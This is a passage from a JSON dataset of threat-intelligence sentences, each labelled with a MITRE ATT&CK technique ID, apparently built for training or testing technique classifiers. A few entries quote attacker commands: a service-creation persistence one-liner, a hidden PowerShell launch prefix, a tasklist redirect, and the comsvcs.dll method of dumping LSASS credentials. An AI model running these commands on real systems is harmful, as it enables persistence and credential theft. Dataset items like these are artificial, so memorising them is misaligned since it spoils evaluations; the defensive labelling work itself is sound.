    ]
  },
  {
    "type": "text",
    "text": " LoadLibrary ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Minidump of LSASS process memory",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server.  executed shellcode to identify the name of the infected host.(Citation: ESET OceanLotus)(Citation: ESET OceanLotus Mar 2019)(Citation: ESET OceanLotus macOS April 2019)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor connected via RDP to a user’s workstation",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can create or add files to Registry Run Keys to establish persistence.(Citation: Cybereason Bazar July 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has deleted Registry keys to clean up its prior activity. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can create a remote shell and execute commands using .",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "is capable of gathering system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence under the Registry key HKCU\\Software\\Run auto_update.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used `ps ax | grep <name> | grep -v grep | ...` and `ps ax | grep -E...` to conduct process discovery.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The code will gather some information about the system, specifically the local IP address, MAC address, and the external IP address of the system",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used WMI queries to check if various security applications were running as well as the operating system version.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "used a compiled remote desktop malware,",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "process hollowing was used to inject a malicious PE file into the legitimate process called aspnet_compiler.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can launch a remote shell to execute commands on the victims machine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "System Information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has moved laterally via RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "uses credential dumpers such as  and  to extract cached credentials from Windows systems.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect data from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "executes commands remotely on the infected host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "creates a registry key",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to inject a DLL into running processes including the  DLL into explorer.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used a utility called CLOSESHAVE that can securely delete a file from the system. They have also removed malware tools or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.(Citation: FireEye APT38 Oct 2018)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Enumerates files under Steam application directory",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Legitimate accounts obtained by the attackers can be used to ensure persistence in the compromised infrastructure.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "created a service using the command sc create SysUpdate binpath= cmd /c start [file path]&&sc config SysUpdate start= auto&&netstart SysUpdate for persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "then two batch scripts were dropped and run.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors used two scripts named s.bat (for servers) and w.bat",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use `CMD` to execute commands.(Citation: ClearSky Siamesekitten August 2021)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "an injected Cobalt Strike beacon",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "reaching out to the server to obtain a further payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can inject its payload into iexplore.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Figure 4: Embedded URL in OLE object    Figure 5: HTTP GET request to download the next level payload The downloaded file, doc.doc, is XML-based and contains a PowerShell command (shown in Figure 6) that subsequently downloads the binary Pause.ps1",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate all files and directories on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "invokes the following API’s:",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP/S in C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "RDP traffic and minimize external RDP access",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI to monitor for and kill specific processes listed in its configuration file.(Citation: Secureworks GandCrab and REvil September 2019)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has a module to delete itself from the infected machine.(Citation: Proofpoint TA505 Jan 2019)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Service Type: user mode serviceService Start Type: auto startService Account: LocalSystem",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get users to launch malicious documents to deliver its payload.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors relied on users to enable macros within a malicious Microsoft Word document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "designed to stop Cisco AMP.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can install a Registry Run key for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to download files to execute on the victims machine.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020) ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "to download additional malicious files",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The activity thereafter included dumps of LSASS",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "copies a file over to the remote system before execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can create a new service named msamger (Microsoft Security Accounts Manager).",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "stages the output from command execution and collected files in specific folders before exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "contains commands to list files and directories as well as search for files matching certain extensions from a defined list.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can load additional files and tools including .",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP and HTTPS for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors checked running processes on the accessed hosts via taskmanager",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "the adversary now armed with the valid account, was able to access a document stored in SharePoint Online, part of Microsoft Office 365.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The loader will then inject a DLL backdoor into dllhost.exe",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "generate the HTTP request",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the command line argument\nprovided",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "the username",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "the payload is either loaded into its own process or a remote one.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Manually executing the lnk file triggers",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used stolen credentials to compromise Outlook Web Access (OWA).",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can execute arbitrary shell commands on the victims' machines.(Citation: Cybereason Molerats Dec 2020) ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "collects the victims username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has uploaded and downloaded files to utilize additional plugins.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use stolen credentials to authenticate on target networks.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "will delete files on the system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "allows adversaries to search for files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can add the following registry entry: HKEY_CURRENT_USER\\SOFTWARE\\{8 random characters}.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can recursively search for files in folders and collects files from the desktop with certain extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "removes batch files to reduce fingerprint on the system as well as deletes the CAB file that gets encoded upon infection.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can obtain information about the victim usernames.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can use `DsRoleGetPrimaryDomainInformation` to determine the role of the infected machine.  can also halt execution if the compromised host is identified as a domain controller.(Citation: Cisco CaddyWiper March 2022)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP and HTTPS in communication with C2.(Citation: Cylance Sodinokibi July 2019)(Citation: Secureworks GandCrab and REvil September 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A new registry entry is created at HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics with a value of “C:\\ ProgramData \\ Initech \\Initech.exe” /run.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list all running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Technique Description   Fan Check The Trojan will perform the following WMI query:   Select * from Win32_Fan According to MSDN, this query should return a class that provides statistics on the CPU fan",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate drive types.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has been executed from malicious Excel or Word documents containing macros.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has relied on users opening malicious email attachments decompressing the attached archive and double-clicking the executable within.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "To the victim, the opening process simply looks like a regular directory.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used attempted to lure victims into opening malicious e-mail attachments.(Citation: ThreatConnect Kimsuky September 2020)(Citation: VirusBulletin Kimsuky October 2019)(Citation: CISA AA20-301A Kimsuky)(Citation: Cybereason Kimsuky November 2020)(Citation: Malwarebytes Kimsuky June 2021)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "modified Windows Services to ensure PowerShell scripts were loaded on the system.  also creates a Windows service to establish persistence.(Citation: ESET OceanLotus)(Citation: Cybereason Cobalt Kitty 2017)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "being invoked by rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has a command to delete files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "CARROTBAT itself is a dropper that allows an attacker to drop and open an embedded decoy file, followed by the execution of a command that will download and run a payload on the targeted machine",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "They utilized RDP,",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The Uploader variant of  visits a hard-coded server over HTTP/S to download the images  uses to receive commands.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect IP addresses from a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The  encryption process has used batch scripts with various commands.(Citation: FireEye Maze May 2020)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "to start the download process",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can identify the computer name of a compromised host.(Citation: PWC WellMess July 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The Azure AD Connector account and the compromised administrator account were then used to perform",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "is capable of creating a reverse shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used malware to identify the computer name of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "compromised user credentials and used valid accounts for operations.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "enumerates values in the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Malicious commands are executed via WMI as a means of “living off the land” and avoiding detection.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "the Loader overwrites the current PE with the final payload’s PE",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "creates a new service to establish.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Manipulate files and directories (list, download, upload, view, delete",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used the `ExitWindowsEx` API to flush file buffers to disk and stop running processes.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has delivered macros which can tamper with Microsoft Office security settings.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect the RegisteredOwner RegisteredOrganization and InstallDate registry values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can modify Registry values within HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\<Excel Version>\\Excel\\Security\\AccessVBOM\\ to enable the execution of additional code.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "actors used tools such as PCHunter, PowerTool, GMER, and Process Hacker to disable any security-related services running in the system.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "uses the DownloadFile method of the WebClient object to download the file from the specified URL and save it to the specified local file path.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "leveraged  to extract Windows Credentials of currently logged-in users and steals passwords stored in browsers.(Citation: Lazarus KillDisk)  has also used a custom version  to capture credentials. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the user on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP for C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During a file analysis of PLAINTEE in WildFire, we observed the attackers download and execute a plugin during the runtime for that sample",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor connected via Remote Desktop to a Domain Controller",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can upload files from compromised hosts.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It will:  Download and execute the backdoor component Replace the content of the downloader Mach-O executable with a decoy, either using a base64-encoded embedded file or by downloading it from the internet Open a decoy document (described later) Close the Terminal window that just opened  The decoy document replaces the downloader Mach-O file, which means the malicious executable is only present in the ZIP file now",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Since it is a very long term group, some victims may be impossible to identify now",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "it communicates to its C&C servers over the MQTT protocol, which is commonly used in internet-of-things (IoT) devices",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Following exploitation with  malware  actors created a file containing a list of commands to be executed on the compromised computer.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP or HTTPS for C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has created new services for persistence by modifying the Registry.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has a command to edit the Registry on the victims machine.(Citation: GitHub QuasarRAT)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can determine the system architecture it is running on to choose which version of the DLL to use.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors obtained a list of running processes on a victim machine using `cmd /c tasklist > %temp%\\temp.ini`.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "relies on users clicking on an embedded image to execute the scripts.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to inject shellcode into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has added persistence to the `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` Registry key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "used cmd.exe /c within a malicious macro.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has injected a DLL into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can retrieve system information such as CPU speed from Registry keys.(Citation: Symantec Trojan.Hydraq Jan 2010)",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to execute command line arguments on a compromised host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "leverages WMI to enumerate anti-virus on the victim.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has a module to collect information from the local database. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download additional files from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to check running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "registry key where each embedded resource is to be written",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can inject into a target process including Svchost Explorer and cmd using process hollowing.(Citation: Cybereason Bazar July 2020)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has modified registry keys using the reg windows utility for its custom backdoor implants.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used  to obtain the compromised machine's name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The XSL script contains additional hard coded variables sVarRaz and sVar2RazX, which contain file paths that direct to the downloaded files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTPS to conceal C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can gather the victim computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A  tool can add the binarys path to the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run to add persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "*Command_Create&Inject: This command creates a new process (using a supplied filename as the process name) and then injects malicious code into it",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "creates a Registry entry to ensure infection after reboot under HKLM\\Software\\Microsoft\\Windows\\currentVersion\\Run.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "In one version of the malware, the code checks if the “ProgramData” folder has folders or files with the keywords “Kasper“, “Panda“, or “ESET“",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve the ARP cache from the local system by using the GetIpNetTable() API call and check to ensure IP addresses it connects to are for local non-Internet systems. ",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "collects the IP address of a compromised system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "searches for files on the victim's machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has been executed by luring victims to open malicious e-mail attachments.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Two of them are MacOS X User-Agents and the third is a hashed string:  Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/BADDAD Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405   E9BC3BD76216AFA560BFB5ACAF5731A3   Figure 5: SpeakUp `s requests are encrypted with the salted base64 and include the unique User-Agent At the moment SpeakUp serves XMRig miners to its listening infected servers",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has added paths to executables in the Registry to establish persistence.(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can achieve persistence through a Registry Run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI to open a Windows command shell on a remote machine.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can execute WMI queries to gather information.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "uses module networkDll for process list discovery.(Citation: ESET Trickbot Oct 2020)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The SP variable is a string containing the victim's username",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "deleted many of its files used during operations as part of cleanup including removing applications and deleting screenshots.(Citation: US-CERT TA18-074A)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "contains modules such as Get-ComputerInfo for enumerating common system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "designed to steal sensitive information, including login data, cookies, and Facebook ad and business account information.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to gain system privileges through Windows services.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can delete files.(Citation: Symantec Trojan.Hydraq Jan 2010)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The minidump function of comsvcs.dll can be used to dump lsass.exe.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The OwaAuth web shell enables a threat actor to upload and download files, launch processes, and execute SQL queries",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "gathers information about the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can download remote files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "which was then fed to a batch script",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Word document lure requesting the user to run the VBA macro.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has a command to perform a process listing.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Identify processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe to execute arbitrary commands on the infected host across different stages of the infection chain.(Citation: Talos Konni May 2017)(Citation: Medium KONNI Jan 2020) ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has monitored files' modified time.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can upload files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can send HTTP GET requests to malicious servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Several HTTP Post events were observed to the identified domains",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors modified the `IKEEXT` and `PrintNotify` Windows services for persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "disabling security tools",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can use RunDLL32 for execution.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "DRIVE Lists the logical drives and the type, as well the total/free space of the fixed devices",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "checks for the existence of a Registry key and if it contains certain values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the IP of the infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence by creating an autostart service that allows it to run whenever the machine boots.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors also created a remote thread in svchost.exe",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\system32\\cmd.exe /C powershell.exe -nop -w hidden -c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has relied on users enabling malicious macros within Microsoft Excel and Word attachments.(Citation: ZScaler Squirrelwaffle Sep 2021)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used known administrator account credentials to execute the backdoor directly.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used dynamic API resolution to avoid identifiable strings within the binary including RegEnumKeyW.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "stored in the Windows registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "executes a CMD file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can download remote files onto victims.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "undocumented Windows API that causes",
